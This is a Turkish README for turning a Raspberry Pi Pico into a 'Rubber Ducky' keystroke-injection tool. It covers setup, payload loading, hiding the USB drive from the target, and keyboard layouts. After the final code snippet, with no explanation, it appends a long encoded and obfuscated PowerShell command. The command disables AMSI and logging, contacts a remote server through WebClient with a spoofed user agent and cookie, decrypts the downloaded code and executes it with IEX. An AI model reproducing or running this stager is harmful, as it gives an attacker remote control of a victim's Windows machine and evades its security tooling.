# Raspberry-Pi-Pico-as-a-Rubber-Ducky 

![2022-02-09-16-58-32_Trim](https://user-images.githubusercontent.com/29992381/153216687-11a80cd9-38f5-4b8a-b247-9fe963997136.gif)


## Kurulum

1) Raspberry Pi Pico cihazınız için CircuitPython'u [indirin](https://circuitpython.org/board/raspberry_pi_pico/). 
2) Boot düğmesine basılı tutarken cihazı bir USB bağlantı noktasına takın ve cihazı taktıktan sonra boot tuşundan elinizi çekin. Bunun sonucunda "RPI-RP2" adlı çıkarılabilir bir medya aygıtı karşınıza çıkacaktır.
3) İndirdiğiniz .uf2 dosyasını Pico'nun (RPI-RP2) ana dizinine kopyalayın. Bir süre sonra cihaz yeniden başlayacak ve 1-2 saniye sonra CIRCUITPY adında çıkarılabilir bir medya aygıtı olarak karşınıza çıkacaktır.
4) Ardından [adafruit-circuitpython-bundle-7.x-mpy-YYYYMMDD.zip](https://github.com/adafruit/Adafruit_CircuitPython_Bundle/releases/latest) dosyasını indirin ve cihazın dışına çıkarın. 
5) adafruit-circuitpython-bundle-7.x-mpy-YYYYMMDD klasörü altındaki "lib" klasörüne gidin ve "adafruit_hid'i" Raspberry Pi Pico'nuzdaki lib klasörüne kopyalayın.
6) [Buradaki](https://raw.githubusercontent.com/dbisu/pico-ducky/main/duckyinpython.py) sayfaya giderek CTRL + S tuşlarına basın ve dosyayı Pico'nun içerisinde bulunan code.py dosyasının üzerine yazarak Raspberry Pi Pico'nun ana dizinine "code.py" olarak kaydedin.
7) [Buradaki](https://github.com/hak5darren/USB-Rubber-Ducky/wiki/Payloads) linkten bir script bulun veya kendi Rubber Ducky scriptinizi [oluşturun](https://github.com/hak5darren/USB-Rubber-Ducky/wiki/Duckyscript) ve "payload.dd" olarak kaydedin.
8) Dikkat edin, son işlemden sonra cihaz yeniden başlatılacak ve yarım saniye sonra komut dosyası (payload.dd) çalışacaktır.

## USB Etkinleştirme/Devre Dışı Bırakma

Pico'nun gizlilik amacıyla bir USB depolama aygıtı gibi görünmemesine istiyorsanız;
1) Cihazı USB bağlantı noktasına takın.
2) "boot.py" dosyasını Pico'nun (RPI-RP2) ana dizinine kopyalayın.
3) payload.dd dosyanızı da Pico'ya (RPI-RP2) kopyalayın.
4) Pico'yu bilgisayarınızdan çıkarın. Pin 18 ve pin 20 arasına bir jumper kablosu bağlayın. Bu durum Pico üzerinde bir kısa devre yaratacaktır ve hedef bilgisayara takıldığında Pico'nun bir USB sürücüsü olarak görünmesini engelleyecek.
5) Tekrar programlamak için (Payload'ınızı güncellemek için) jumper kabloyu çıkarın ve PC'nize yeniden bağlayın. Varsayılan modda, USB depolama aygıtı aktif durumda olacaktır.

![1](https://user-images.githubusercontent.com/29992381/153219218-98d55417-4d9f-45a9-bbdf-1d719625b41d.jpg)


## Klavye Düzenlerini Değiştirme

Varsayılan modda klavye düzeni İngilizce'dir. Bunu değiştirmek isterseniz;
1) https://kbdlayout.info/ sayfasından istediğiniz klavye düzenini bularak üzerine tıklayın ve linki kopyalayıp https://www.neradoc.me/layouts/ sayfasındaki kutucuğa yapıştırın. Ardından "Make Zip Bundle Links" butonuna tıklayın.
2) Ardından "Download the zip file (.py)" butonuna tıklayın.
3) İndirilen dosyanın içerisinden kendize uygun olan klavye düzeninin dosyalarını Pico'nuzun içerisindeki lib klasörü altına kopyalayın (ben Türkçe Q klavye düzenini tercih ediyorum);
- keyboard_layout.mpy
- keyboard_layout_win_tuq.mpy
- keycode_win_tuq.mpy

![2](https://user-images.githubusercontent.com/29992381/153212715-a0efbc44-1b14-41aa-8f2b-da8b7e0c4ab9.png)

## Dil Dosyanızı Kullanmak için Pico Kodunuzu Değiştirin

Pico içerisindeki "code.py" dosyasını açın ve içerisindeki şu kodu;
```python
from adafruit_hid.keyboard_layout_us import KeyboardLayoutUS as KeyboardLayout
from adafruit_hid.keycode import Keycode
```

aşağıdaki kod ile değiştirin;

```python
from keyboard_layout_win_tuq import KeyboardLayout
from keycode_win_tuq import Keycode
```



powershell -noP -sta -w 1 -enc  IAAuACgAIgB7ADEAfQB7ADAAfQAiAC0AZgAnAGUAdAAnACwAJwBzACcAKQAgACgAIgBxADQAWQAiACsAIgBmADIAaQAiACkAIAAgACgAIAAgAFsAVABZAFAAZQBdACgAIgB7ADAAfQB7ADUAfQB7ADEAfQB7ADcAfQB7ADEAMQB9AHsAOAB9AHsANgB9AHsANAB9AHsAMgB9AHsAOQB9AHsAMQAwAH0AewAzAH0AIgAgAC0AZgAnAFMAeQBTACcALAAnAEUAbQAuAGQAaQBBAGcATgBvAFMAJwAsACcAVgBFAE4AJwAsACcATwB2AEkARABlAHIAJwAsACcATgBnAC4AZQAnACwAJwBUACcALAAnAGkAJwAsACcAdABJAEMAJwAsACcATgBUACcALAAnAFQAJwAsACcAUAByACcALAAnAHMALgBlAHYARQAnACkAIAApACAAIAA7ACAAJAB7AFUAMAA0ADIAYAA1AEwAfQAgAD0AIAAgAFsAdAB5AFAARQBdACgAIgB7ADEAfQB7ADAAfQAiACAALQBGACAAJwBGACcALAAnAFIARQAnACkAOwAgACAAIAAuACgAIgB7ADAAfQB7ADEAfQAiACAALQBmACAAJwBTAGUAVAAtAGkAJwAsACcAVABlAE0AJwApACAAKAAiAHYAQQByAEkAIgArACIAQQBiACIAKwAiAGwAIgArACIAZQA6ACIAKwAiAHkAaABOAEkAIgApACAAIAAoACAAIABbAHQAeQBQAGUAXQAoACIAewAzAH0AewAwAH0AewA0AH0AewAyAH0AewAxAH0AIgAgAC0ARgAnAC4AJwAsACcARQBwAG8AaQBuAHQATQBhAE4AYQBnAGUAUgAnACwAJwByAFYASQBDACcALAAnAHMAWQBzAFQAZQBtAC4ATgBFAHQAJwAsACcAcwBFACcAKQAgACAAKQAgADsAJAB7AFIAYABGAFYAfQAgAD0AIABbAHQAeQBwAEUAXQAoACIAewAwAH0AewAzAH0AewAxAH0AewAyAH0AIgAgAC0ARgAgACcAdABlAHgAVAAuACcALAAnAEkATgAnACwAJwBnACcALAAnAGUATgBDAG8ARAAnACkAIAAgADsAIAAgACQAewAyAGAANABDAH0AIAA9ACAAIABbAHQAWQBwAGUAXQAoACIAewAxAH0AewAwAH0AIgAgAC0ARgAgACcAUgBUACcALAAnAGMATwBuAHYARQAnACkAIAAgADsAIAAgACYAKAAiAHsAMgB9AHsAMQB9AHsAMAB9ACIALQBmACcAbABFACcALAAnAEUAVAAtAHYAYQBSAEkAYQBiACcALAAnAFMAJwApACAAKAAnAGkAYgB4ACcAKwAnADgAJwApACAAIAAoAFsAdABZAFAARQBdACgAIgB7ADMAfQB7ADEAfQB7ADQAfQB7ADIAfQB7ADAAfQAiAC0AZgAgACcAYgByAEUAUQB1AEUAcwBUACcALAAnAFMAVABlAE0ALgAnACwAJwAuAHcAZQAnACwAJwBzAFkAJwAsACcAbgBlAFQAJwApACAAIAApACAAOwAgACQAewBHAGAAagA4AEIAfQAgACAAPQAgACAAWwB0AHkAcABFAF0AKAAiAHsANgB9AHsANQB9AHsAMQB9AHsAMAB9AHsAMgB9AHsANAB9AHsAMwB9ACIALQBGACAAJwBSAGUAZABFAE4AVABJACcALAAnAHQAZQBtAC4AbgBlAFQALgBDACcALAAnAGEAJwAsACcAZQAnACwAJwBsAEMAYQBjAEgAJwAsACcAUwAnACwAJwBTAHkAJwApACAAOwAgACQAewBQAGAAUwAxAH0APQAgACAAWwB0AFkAcABFAF0AKAAiAHsAMQB9AHsAMgB9AHsANAB9AHsAMAB9AHsAMwB9ACIALQBGACAAJwBDAE8AZABpACcALAAnAFMAWQBTAFQARQAnACwAJwBNACcALAAnAG4ARwAnACwAJwAuAHQARQBYAFQALgBFAG4AJwApACAAOwAgACAASQBmACgAJAB7AFAAUwB2AEUAcgBgAHMAaQBgAE8AbgBgAFQAYQBiAEwARQB9AC4AIgBwAFMAdgBgAEUAUgBTAGAAaQBPAG4AIgAuACIATQBBAGoAYABPAHIAIgAgAC0AZwBlACAAMwApAHsAJAB7AFIAYABlAEYAfQA9ACAAKAAgACAALgAoACIAewAxAH0AewAwAH0AIgAtAGYAJwBpAHIAJwAsACcARAAnACkAIAAgACgAJwBWAGEAJwArACcAUgBpAEEAYgBMAEUAOgBVACcAKwAnADAANAAnACsAJwAyADUATAAnACkAIAApAC4AIgB2AGAAQQBMAHUARQAiAC4AIgBhAHMAcwBgAEUAbQBgAEIATAB5ACIALgAoACIAewAxAH0AewAwAH0AewAyAH0AIgAgAC0AZgAnAFQAeQBwACcALAAnAEcAZQB0ACcALAAnAGUAJwApAC4ASQBuAHYAbwBrAGUAKAAoACIAewA3AH0AewAwAH0AewAxAH0AewAyAH0AewA2AH0AewAzAH0AewA0AH0AewA1AH0AIgAgAC0AZgAgACcAbgBhACcALAAnAGcAJwAsACcAZQBtAGUAbgAnACwAJwBpAG8AJwAsACcAbgAuAEEAbQBzACcALAAnAGkAVQB0AGkAbABzACcALAAnAHQALgBBAHUAdABvAG0AYQB0ACcALAAnAFMAeQBzAHQAZQBtAC4ATQBhACcAKQApADsAJAB7AFIAYABFAEYAfQAuACgAIgB7ADIAfQB7ADAAfQB7ADEAfQAiAC0AZgAnAGUAdABGAGkAJwAsACcAZQBsAGQAJwAsACcARwAnACkALgBJAG4AdgBvAGsAZQAoACgAIgB7ADIAfQB7ADEAfQB7ADMAfQB7ADAAfQAiACAALQBmACAAJwBlAGQAJwAsACcAaQB0AEYAJwAsACcAYQBtAHMAaQBJAG4AJwAsACcAYQBpAGwAJwApACwAKAAiAHsAMwB9AHsAMgB9AHsANAB9AHsAMQB9AHsAMAB9ACIAIAAtAGYAJwBsAGkAYwAsAFMAdABhAHQAaQBjACcALAAnAGIAJwAsACcAbgAnACwAJwBOAG8AJwAsACcAUAB1ACcAKQApAC4AKAAiAHsAMQB9AHsAMAB9ACIALQBmACAAJwBlAHQAdgBhAGwAdQBlACcALAAnAFMAJwApAC4ASQBuAHYAbwBrAGUAKAAkAHsATgB1AGAATABMAH0ALAAkAHsAVABgAFIAdQBFAH0AKQA7ACAAKAAgACAAJgAoACIAewAwAH0AewAxAH0AewAyAH0AIgAgAC0AZgAgACcAVgBBAHIAJwAsACcASQBBACcALAAnAGIAbABFACcAKQAgACgAIgBxADQAWQAiACsAIgBGADIAaQAiACkAIAAgACkALgAiAHYAYABBAGwAVQBFACIALgAoACIAewAyAH0AewAwAH0AewAxAH0AIgAtAGYAIAAnAEYAaQBlACcALAAnAGwAZAAnACwAJwBHAGUAdAAnACkALgBJAG4AdgBvAGsAZQAoACgAIgB7ADEAfQB7ADAAfQAiAC0AZgAnAG4AYQBiAGwAZQBkACcALAAnAG0AXwBlACcAKQAsACgAIgB7ADEAfQB7ADIAfQB7ADMAfQB7ADAAfQAiACAALQBmACAAJwBlACcALAAnAE4AbwBuACcALAAnAFAAdQBiAGwAaQAnACwAJwBjACwASQBuAHMAdABhAG4AYwAnACkAKQAuACgAIgB7ADEAfQB7ADIAfQB7ADAAfQAiAC0AZgAgACcAbAB1AGUAJwAsACcAUwBlAHQAVgAnACwAJwBhACcAKQAuAEkAbgB2AG8AawBlACgAIAAgACgAIAAuACgAIgB7ADIAfQB7ADAAfQB7ADEAfQAiAC0AZgAgACcAaQBBAEIAJwAsACcATABlACcALAAnAFYAYQBSACcAKQAgACgAJwBVACcAKwAnADAANAAnACsAJwAyADUATAAnACkAKQAuACIAVgBgAEEATABVAGUAIgAuACIAYQBzAFMARQBgAG0AYABCAEwAWQAiAC4AKAAiAHsAMAB9AHsAMQB9ACIALQBmACcARwAnACwAJwBlAHQAVAB5AHAAZQAnACkALgBJAG4AdgBvAGsAZQAoACgAIgB7ADgAfQB7ADUAfQB7ADAAfQB7ADYAfQB7ADcAfQB7ADIAfQB7ADQAfQB7ADEAfQB7ADMAfQAiAC0AZgAgACcAYQB0ACcALAAnAGQAJwAsACcAbgBnAC4AUABTAEUAdAB3AEwAbwBnACcALAAnAGUAcgAnACwAJwBQAHIAbwB2AGkAJwAsACcALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtACcALAAnAGkAbwAnACwAJwBuAC4AVAByAGEAYwBpACcALAAnAFMAeQBzAHQAZQBtACcAKQApAC4AKAAiAHsAMQB9AHsAMgB9AHsAMAB9ACIALQBmACcAbABkACcALAAnAEcAZQB0ACcALAAnAEYAaQBlACcAKQAuAEkAbgB2AG8AawBlACgAKAAiAHsAMAB9AHsAMgB9AHsAMQB9ACIAIAAtAGYAIAAnAGUAdAAnACwAJwBpAGQAZQByACcALAAnAHcAUAByAG8AdgAnACkALAAoACIAewAzAH0AewAxAH0AewAwAH0AewAyAH0AIgAgAC0AZgAgACcAYQB0ACcALAAnAGMALABTAHQAJwAsACcAaQBjACcALAAnAE4AbwBuAFAAdQBiAGwAaQAnACkAKQAuACgAIgB7ADAAfQB7ADEAfQAiACAALQBmACcARwAnACwAJwBlAHQAVgBhAGwAdQBlACcAKQAuAEkAbgB2AG8AawBlACgAJAB7AE4AYABVAEwATAB9ACkALAAwACkAOwB9ADsAIAAoAC4AKAAiAHsAMAB9AHsAMgB9AHsAMQB9ACIAIAAtAGYAJwBWACcALAAnAEEAYgBsAGUAJwAsACcAYQByAGkAJwApACAAKAAiAHkAIgArACIASABOAGkAIgApACAAKQAuACIAVgBBAEwAYABVAEUAIgA6ADoAIgBFAHgAUABlAGAAYwBgAFQAYAAxADAAMABjAG8ATgB0AEkAYABOAHUAZQAiAD0AMAA7ACQAewB3AGAAQwB9AD0AJgAoACIAewAwAH0AewAxAH0AewAyAH0AIgAgAC0AZgAgACcATgAnACwAJwBlACcALAAnAHcALQBPAGIAagBlAGMAdAAnACkAIAAoACIAewA0AH0AewAyAH0AewAwAH0AewAxAH0AewAzAH0AIgAgAC0AZgAnAGUAbQAuAE4AZQAnACwAJwB0AC4AVwBlAGIAQwBsAGkAZQBuACcALAAnAHkAcwB0ACcALAAnAHQAJwAsACcAUwAnACkAOwAkAHsAdQB9AD0AKAAiAHsAMQA3AH0AewA3AH0AewAzAH0AewAxADEAfQB7ADQAfQB7ADEANAB9AHsAOAB9AHsAMQAyAH0AewAwAH0AewA5AH0AewA2AH0AewAxADgAfQB7ADEAMwB9AHsAMgB9AHsAMQAwAH0AewA1AH0AewAxADUAfQB7ADEAfQB7ADEANgB9ACIAIAAtAGYAIAAnAE8AJwAsACcAIABHACcALAAnAHIAJwAsACcAbABsAGEALwA1ACcALAAnACAAKAAnACwAJwAwACkAIABsAGkAJwAsACcAZABlAG4AdAAnACwAJwBvAHoAaQAnACwAJwB3AHMAIABOACcALAAnAFcANgA0ADsAIABUAHIAaQAnACwAJwB2ADoAMQAxAC4AJwAsACcALgAwACcALAAnAFQAIAA2AC4AMQA7ACAAVwAnACwAJwAwADsAIAAnACwAJwBXAGkAbgBkAG8AJwAsACcAawBlACcALAAnAGUAYwBrAG8AJwAsACcATQAnACwAJwAvADcALgAnACkAOwAkAHsAcwBgAEUAcgB9AD0AJAAoACAAJAB7AHIAYABGAHYAfQA6ADoAIgBVAE4AYABpAGAAQwBPAGQAZQAiAC4AIgBnAGUAdABTAFQAYABSAEkAYABOAGcAIgAoACAAKAAmACgAIgB7ADAAfQB7ADIAfQB7ADMAfQB7ADEAfQAiACAALQBmACcARwBlAFQALQBWAGEAJwAsACcARQAnACwAJwBSAEkAJwAsACcAYQBCAEwAJwApACAAKAAiAHsAMQB9AHsAMAB9ACIALQBmACcANABDACcALAAnADIAJwApACAAIAAtAFYAYQBsACkAOgA6ACgAIgB7ADQAfQB7ADIAfQB7ADEAfQB7ADAAfQB7ADMAfQAiACAALQBmACAAJwA0AFMAdAByACcALAAnAGEAcwBlADYAJwAsACcAbwBtAEIAJwAsACcAaQBuAGcAJwAsACcARgByACcAKQAuAEkAbgB2AG8AawBlACgAKAAiAHsANAB9AHsANQB9AHsAMAB9AHsAMQA1AH0AewAxADgAfQB7ADYAfQB7ADEAMgB9AHsAMwB9AHsAOAB9AHsAOQB9AHsAMQA3AH0AewAxAH0AewAxADEAfQB7ADEAMwB9AHsANwB9AHsAMQA0AH0AewAyAH0AewAxADYAfQB7ADEAMAB9ACIALQBmACAAJwBRAEEAYwBBACcALAAnAE4AJwAsACcATQBRAEEAdQBBAEQATQBBAE8AUQBBADYAQQBEACcALAAnAHgAQQBEAGsAQQAnACwAJwBhAEEAJwAsACcAQgAwAEEASAAnACwAJwBMAHcAJwAsACcANAAnACwAJwBNAGcAJwAsACcAQQB1AEEAJwAsACcATQBnAEEAegBBAEQAUQBBACcALAAnAGcAJwAsACcAQQAnACwAJwBBACcALAAnAEEAQwA0AEEAJwAsACcAQQA2AEEAQwA4ACcALAAnAEUAQQAnACwAJwBEAEUAQQAnACwAJwBBACcAKQApACkAKQA7ACQAewB0AH0APQAoACIAewAwAH0AewAxAH0AewAyAH0AIgAgAC0AZgAnAC8AbgBlACcALAAnAHcAcwAuAHAAJwAsACcAaABwACcAKQA7ACQAewBXAEMAfQAuACIASABgAGUAYQBEAGAARQBSAHMAIgAuACgAIgB7ADAAfQB7ADEAfQAiAC0AZgAgACcAQQAnACwAJwBkAGQAJwApAC4ASQBuAHYAbwBrAGUAKAAoACIAewAyAH0AewAxAH0AewAwAH0AewAzAH0AIgAgAC0AZgAgACcAZQAnACwAJwByAC0AQQBnACcALAAnAFUAcwBlACcALAAnAG4AdAAnACkALAAkAHsAdQB9ACkAOwAkAHsAVwBgAEMAfQAuACIAUAByAGAAbwB4AFkAIgA9ACAAIAAoAC4AKAAiAHsAMQB9AHsAMAB9ACIAIAAtAGYAIAAnAFIAJwAsACcAZABpACcAKQAgACgAJwB2AEEAJwArACcAUgBJACcAKwAnAEEAYgBMAGUAOgBJAGIAWAAnACsAJwA4ACcAKQAgACkALgAiAFYAQQBsAGAAVQBlACIAOgA6ACIARABFAGYAYQBgAFUAYABsAHQAVwBFAEIAcABgAFIAYABPAFgAWQAiADsAJAB7AHcAYwB9AC4AIgBwAGAAUgBPAFgAWQAiAC4AIgBjAGAAUgBgAEUAZABlAG4AVABpAGAAQQBsAHMAIgAgAD0AIAAgACAAKAAgACAAJgAoACIAewAxAH0AewAwAH0AIgAtAGYAJwBlAG0AJwAsACcAaQB0ACcAKQAgACAAKAAiAFYAQQBSACIAKwAiAGkAIgArACIAQQBiACIAKwAiAEwAZQA6AGcASgA4AEIAIgApACkALgAiAHYAYABBAEwAVQBlACIAOgA6ACIAZABgAGUAZgBgAEEAdQBsAGAAVABuAEUAdAB3AGAAbwBSAGAASwBDAGAAUgBFAGQAZQBOAFQAaQBhAEwAcwAiADsAJAB7AFMAYwByAEkAUAB0ADoAYABwAGAAUgBPAHgAeQB9ACAAPQAgACQAewBXAEMAfQAuACIAUAByAGAAbwB4AFkAIgA7ACQAewBrAH0APQAgACAAJAB7AFAAYABTADEAfQA6ADoAIgBBAHMAYwBgAGkAaQAiAC4AKAAiAHsAMAB9AHsAMgB9AHsAMQB9ACIALQBmACcARwBlAHQAJwAsACcAeQB0AGUAcwAnACwAJwBCACcAKQAuAEkAbgB2AG8AawBlACgAJwBnAE4ATABBAEIARAAhAFUAfgAzADUAeQBHAGsAdQBWAEoAKABTAD8AMgBwAGUAfQBfADAAegBIAEYAdwBkADYAJwApADsAJAB7AFIAfQA9AHsAJAB7AEQAfQAsACQAewBLAH0APQAkAHsAQQByAGAAZwBzAH0AOwAkAHsAcwB9AD0AMAAuAC4AMgA1ADUAOwAwAC4ALgAyADUANQB8AC4AKAAnACUAJwApAHsAJAB7AGoAfQA9ACgAJAB7AEoAfQArACQAewBzAH0AWwAkAHsAXwB9AF0AKwAkAHsASwB9AFsAJAB7AF8AfQAlACQAewBrAH0ALgAiAEMATwBgAFUATgBUACIAXQApACUAMgA1ADYAOwAkAHsAUwB9AFsAJAB7AF8AfQBdACwAJAB7AFMAfQBbACQAewBqAH0AXQA9ACQAewBTAH0AWwAkAHsASgB9AF0ALAAkAHsAUwB9AFsAJAB7AF8AfQBdAH0AOwAkAHsARAB9AHwAJgAoACcAJQAnACkAewAkAHsAaQB9AD0AKAAkAHsAaQB9ACsAMQApACUAMgA1ADYAOwAkAHsASAB9AD0AKAAkAHsASAB9ACsAJAB7AFMAfQBbACQAewBpAH0AXQApACUAMgA1ADYAOwAkAHsAUwB9AFsAJAB7AEkAfQBdACwAJAB7AFMAfQBbACQAewBoAH0AXQA9ACQAewBTAH0AWwAkAHsAaAB9AF0ALAAkAHsAcwB9AFsAJAB7AEkAfQBdADsAJAB7AF8AfQAtAGIAeABvAHIAJAB7AHMAfQBbACgAJAB7AFMAfQBbACQAewBpAH0AXQArACQAewBzAH0AWwAkAHsASAB9AF0AKQAlADIANQA2AF0AfQB9ADsAJAB7AHcAQwB9AC4AIgBoAGAAZQBhAGAAZABlAFIAcwAiAC4AKAAiAHsAMQB9AHsAMAB9ACIAIAAtAGYAIAAnAGQAJwAsACcAQQBkACcAKQAuAEkAbgB2AG8AawBlACgAKAAiAHsAMAB9AHsAMQB9ACIAIAAtAGYAJwBDAG8AbwBrAGkAJwAsACcAZQAnACkALAAoACIAewAzAH0AewAwAH0AewA4AH0AewA3AH0AewA5AH0AewAxAH0AewAyAH0AewA1AH0AewA2AH0AewA0AH0AIgAtAGYAJwBaAEkAegBuACcALAAnAFIAMQAnACwAJwBSACcALAAnAG4AJwAsACcAZwA9ACcALAAnAHgAVgBaACcALAAnAGQAdgB3AHYAbgByADgANgAnACwAJwBmACcALAAnAGgASwBCAD0AbwB0ACcALAAnAGoARwA2AEcATwBpAFIASgB6ACcAKQApADsAJAB7AGQAYQBgAFQAQQB9AD0AJAB7AFcAYABjAH0ALgAoACIAewAyAH0AewAxAH0AewAwAH0AIgAtAGYAJwB0AGEAJwAsACcAbABvAGEAZABEAGEAJwAsACcARABvAHcAbgAnACkALgBJAG4AdgBvAGsAZQAoACQAewBTAGAARQByAH0AKwAkAHsAVAB9ACkAOwAkAHsAaQBgAFYAfQA9ACQAewBkAGAAQQB0AGEAfQBbADAALgAuADMAXQA7ACQAewBEAGEAYABUAGEAfQA9ACQAewBkAGEAYABUAEEAfQBbADQALgAuACQAewBEAGAAQQB0AEEAfQAuACIAbABlAGAATgBnAFQASAAiAF0AOwAtAGoAbwBpAG4AWwBDAGgAYQByAFsAXQBdACgAJgAgACQAewBSAH0AIAAkAHsAZABgAEEAdABBAH0AIAAoACQAewBpAGAAVgB9ACsAJAB7AEsAfQApACkAfAAmACgAIgB7ADAAfQB7ADEAfQAiAC0AZgAnAEkARQAnACwAJwBYACcAKQA=
